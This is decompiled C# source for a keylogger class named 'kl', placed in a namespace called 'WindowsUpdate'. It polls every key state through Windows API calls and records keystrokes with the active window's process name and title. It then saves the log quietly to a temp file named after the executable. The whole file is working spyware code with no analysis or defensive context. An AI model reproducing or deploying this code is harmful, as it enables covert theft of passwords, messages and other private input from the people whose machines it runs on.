using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace WindowsUpdate;

public class kl
{
	private int LastAV;

	private string LastAS;

	private Keys lastKey;

	public Clock Clock;

	public string Logs;

	private object keyboard;

	public string s;

	public string LogsPath;

	public kl()
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		lastKey = (Keys)0;
		Clock = new Clock();
		Logs = "";
		keyboard = (object)new Keyboard();
		s = new FileInfo(Application.get_ExecutablePath()).get_Name();
		LogsPath = Path.GetTempPath() + "\\" + s + ".tmp";
	}

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] lpKeyState);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uCode, uint uMapType);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int dwLayout);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int vKey);

	private string AV()
	{
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			int lpdwProcessID = default(int);
			GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
			object processById = Process.GetProcessById(lpdwProcessID);
			if (!Conversions.ToBoolean(Operators.OrObject(Operators.AndObject((object)(foregroundWindow.ToInt32() == LastAV), Operators.CompareObjectEqual((object)LastAS, NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null), false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))))
			{
				LastAV = foregroundWindow.ToInt32();
				LastAS = Conversions.ToString(NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null));
				return Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat("\r\n#| [ " + HM(), " "), NewLateBinding.LateGet(processById, (Type)null, "ProcessName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)" "), (object)LastAS), (object)" ] |#"), (object)"\r\n"));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return "";
	}

	private string HM()
	{
		try
		{
			return Clock.get_LocalTime().ToString("yy/MM/dd");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "??/??/??";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string VKCodeToUnicode(uint VKCode)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] lpKeyState = new byte[255];
			if (!GetKeyboardState(lpKeyState))
			{
				return "";
			}
			uint wScanCode = MapVirtualKey(VKCode, 0u);
			IntPtr foregroundWindow = GetForegroundWindow();
			int lpdwProcessID = 0;
			int windowThreadProcessId = GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
			IntPtr dwhkl = (IntPtr)GetKeyboardLayout(windowThreadProcessId);
			ToUnicodeEx(VKCode, wScanCode, lpKeyState, stringBuilder, 5, 0u, dwhkl);
			return stringBuilder.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return ((Enum)(Keys)checked((int)VKCode)).ToString();
	}

	private string Fix(Keys k)
	{
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Invalid comparison between Unknown and I4
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Invalid comparison between Unknown and I4
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Invalid comparison between Unknown and I4
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Invalid comparison between Unknown and I4
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0071: Invalid comparison between Unknown and I4
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_0078: Invalid comparison between Unknown and I4
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Invalid comparison between Unknown and I4
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Invalid comparison between Unknown and I4
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Invalid comparison between Unknown and I4
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Invalid comparison between Unknown and I4
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Invalid comparison between Unknown and I4
		//IL_009f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Invalid comparison between Unknown and I4
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a9: Invalid comparison between Unknown and I4
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Invalid comparison between Unknown and I4
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Invalid comparison between Unknown and I4
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Invalid comparison between Unknown and I4
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Invalid comparison between Unknown and I4
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f6: Invalid comparison between Unknown and I4
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Invalid comparison between Unknown and I4
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_0107: Invalid comparison between Unknown and I4
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Invalid comparison between Unknown and I4
		//IL_0112: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Invalid comparison between Unknown and I4
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0122: Invalid comparison between Unknown and I4
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_012c: Invalid comparison between Unknown and I4
		//IL_013f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0142: Invalid comparison between Unknown and I4
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_0154: Invalid comparison between Unknown and I4
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Invalid comparison between Unknown and I4
		//IL_0183: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Invalid comparison between Unknown and I4
		//IL_0195: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01be: Expected I4, but got Unknown
		//IL_01d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01da: Expected I4, but got Unknown
		bool flag = Conversions.ToBoolean(NewLateBinding.LateGet(keyboard, (Type)null, "ShiftKeyDown", new object[0], (string[])null, (Type[])null, (bool[])null));
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(keyboard, (Type)null, "CapsLock", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))
		{
			flag = ((!flag) ? true : false);
		}
		try
		{
			if (((int)k == 112 || (int)k == 113 || (int)k == 114 || (int)k == 115 || (int)k == 116 || (int)k == 117 || (int)k == 118 || (int)k == 119 || (int)k == 120 || (int)k == 121 || (int)k == 122 || (int)k == 123 || (int)k == 35 || (int)k == 46 || (int)k == 8) ? true : false)
			{
				return "[" + ((Enum)k).ToString() + "]";
			}
			if (((int)k == 160 || (int)k == 161 || (int)k == 65536 || (int)k == 16 || (int)k == 131072 || (int)k == 17 || (int)k == 163 || (int)k == 162 || (int)k == 262144) ? true : false)
			{
				return "";
			}
			if ((int)k == 32)
			{
				return " ";
			}
			if (((int)k == 13 || (int)k == 13) ? true : false)
			{
				if (Logs.EndsWith("[ENTER]\r\n"))
				{
					return "";
				}
				return "[ENTER]\r\n";
			}
			if ((int)k == 9)
			{
				return "[TAP]\r\n";
			}
			checked
			{
				if (flag)
				{
					return VKCodeToUnicode((uint)k).ToUpper();
				}
				return VKCodeToUnicode((uint)k);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result;
			if (flag)
			{
				result = Strings.ChrW((int)k).ToString().ToUpper();
				ProjectData.ClearProjectError();
				return result;
			}
			result = Strings.ChrW((int)k).ToString().ToLower();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void WRK()
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Logs = File.ReadAllText(LogsPath);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		checked
		{
			try
			{
				int num = 0;
				while (true)
				{
					num++;
					int num2 = 0;
					do
					{
						if (GetAsyncKeyState(num2) == -32767)
						{
							Keys k = (Keys)num2;
							string text = Fix(k);
							if (text.Length > 0)
							{
								Logs += AV();
								Logs += text;
							}
							lastKey = k;
						}
						num2++;
					}
					while (num2 <= 255);
					if (num == 1000)
					{
						num = 0;
						int num3 = 20480;
						if (Logs.Length > 20480)
						{
							Logs = Logs.Remove(0, Logs.Length - num3);
						}
						File.WriteAllText(LogsPath, Logs);
					}
					Thread.Sleep(1);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}
}
